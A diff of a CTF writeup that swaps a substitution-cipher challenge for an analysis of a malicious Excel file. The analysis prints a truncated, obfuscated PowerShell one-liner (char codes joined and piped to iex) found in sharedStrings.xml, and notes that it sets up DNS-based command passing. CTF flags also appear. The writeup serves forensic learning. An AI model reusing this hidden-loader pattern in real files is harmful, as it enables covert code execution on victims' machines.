@@ -2,51 +2,31 @@
 Tasks, scripts and writeups of most fun or interesting tasks of DCS17CTF (S21SEC)
 https://challenge.s21sec.com
 
-#### Venezuela – 400 points
+#### Finlandia – 400 points
 
-![](https://i0.wp.com/blogs.tunelko.com/wp-content/uploads/2017/05/VENEZUELA.jpg?w=847&ssl=1)
+![](https://i2.wp.com/blogs.tunelko.com/wp-content/uploads/2017/05/Finlandia.jpg?w=834&ssl=1)
 
-This time we have a python script to cipher text and ciphered file. The contents of the python:
+
+I have an Excel suspicious file as title says and first thing is uncompress or extract contents. So use binwalk, rename as zip or whatever. Inside we have a vba bin file. We can use oledump.py to view its contents.
+
+![](https://i0.wp.com/blogs.tunelko.com/wp-content/uploads/2017/05/fact-vba.jpg?resize=768%2C268&ssl=1)
+
+
+After some time trying to decompress and decode vba bin file , seems no exit so i ‘ve start to search for other files. I have see one in particular. **sharedStrings.xml**:
+
 
 ```
-import sys, string
-tcharset = string.lowercase + ' ,:.'
-kcharset = [chr(x) for x in range(32,48) + range(58,65) + range(91,97) + range(123,127)]
-for linea in sys.stdin:
-    print ''.join([kcharset[tcharset.index(x)] for x in linea])
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="1" uniqueCount="1"><si><t>('83G116G97B114E1...[]...C112B116B98B108C111H99H107C32G123H1'.SplIt('BHECG')|%{([Char][Int]$_)} )-Join''|iex|out-null</t></si></sst>
 ```
 
-tcharset and kcharset are indeed used for “cipher” and “decipher” taking the index. Let’s see:
+So, this is powershell obfuscated code, let’s try to see it’s contents.
 
-```
-tcharset: abcdefghijklmnopqrstuvwxyz ,:. 
-kcharset: [' ', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', ':', ';', '<', '=', '>', '?', '@', '[', '\\', ']', '^', '_', '`', '{', '|', '}', '~']
-secret.txt: +.<^"(%; #.<^/.;^<><=(=>"(.-^<.-^".,/ ; !+$<^ ^+.<^"(%; #.<^/.;^=; -</.<("(.-{^$-^>-^"(%; #.^/.;^=; -</.<("(.-_^+ <^>-(# #$<^#$+^=$[=.^/+ -.^<.-^" ,!( # <^>< -#.^>- ^.;#$- "(.-^#(%$;$-=$^\^-.;, +,$-=$^! <= -=$^".,/+$) _^/$;.^+ <^>-(# #$<^$-^<.^,(<, <^-.^<.-^,.#(%(" # <{^ '''^\^=>^! -#$; ^$<`^ ]$;( *_^(< =< ^+>]
+![](https://i2.wp.com/blogs.tunelko.com/wp-content/uploads/2017/05/fact-ps1.jpg?resize=768%2C321&ssl=1)
 
-```
-
-So for first char on secret (+ sign) correspond a position in tcharset by the index of kcharset. And so on … Modifying original script give us the secret text, swapping tcharset and kcharset:
-
-```
-
-import sys, string
-tcharset = string.lowercase + ' ,:.'
-kcharset = [chr(x) for x in range(32,48) + range(58,65) + range(91,97) + range(123,127)]
-file = 'secreto_e47cadcff56cdcf8cb27eccb61dec09f.txt'
-h = open(file, "r")
-out=''
-for linea in h.readline():
-    #print ''.join([tcharset[kcharset.index(x)] for x in linea])
-    out+=''.join([tcharset[kcharset.index(x)] for x in linea])
-
-print out
-```
-Result:
-```
-$ python HacedorDeSecretos_d696737c071ddf468da3d8884ae15f03.py 
-los cifrados por sustitucion son comparables a los cifrados por transposicion. en un cifrado por transposicion, las unidades del texto plano son cambiadas usando una ordenacion diferente y normalmente bastante compleja, pero las unidades en so mismas no son modificadas. ahhh y tu bandera es: azeriak, isatsa luze
-```
+It creates a DNS client to pass commands on powershell.  Flag is **f25a2fc72690b780b2a14e140ef6a9e0**
 
 
 
-**Flag: azeriak, isatsa luze**
+
+
